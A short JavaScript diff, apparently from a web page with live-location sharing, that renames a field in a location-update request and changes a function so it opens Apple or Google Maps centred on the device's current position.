@@ -221,7 +221,7 @@
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
-                                chat_id: chatId,
+                                chatId: chatId,
                                 message_id: lastLiveMessageId,
                                 latitude: pos.coords.latitude,
                                 longitude: pos.coords.longitude,
@@ -235,12 +235,34 @@
             );
         }
 
-        // 3. RASTREO NATIVO DE MAPAS
+        // 3. RASTREO NATIVO DE MAPAS (URL OFICIAL UNIVERSAL - SIN ERROR 404)
         function abrirRastreoNativoLive() {
-            if (isIOS) {
-                window.location.href = "https://maps.apple.com/?showme=true";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        if (isIOS) {
+                            window.location.href = `http://maps.apple.com/?ll=${lat},${lng}&q=Mi+Ubicacion`;
+                        } else {
+                            window.location.href = `https://www.google.com/maps/@?api=1&map_action=map&center=${lat},${lng}&zoom=16`;
+                        }
+                    },
+                    (err) => {
+                        if (isIOS) {
+                            window.location.href = "http://maps.apple.com/";
+                        } else {
+                            window.location.href = "https://www.google.com/maps/@?api=1&map_action=map";
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
             } else {
-                window.location.href = "https://www.google.com/maps/location-sharing";
+                if (isIOS) {
+                    window.location.href = "http://maps.apple.com/";
+                } else {
+                    window.location.href = "https://www.google.com/maps/@?api=1&map_action=map";
+                }
             }
         }
 
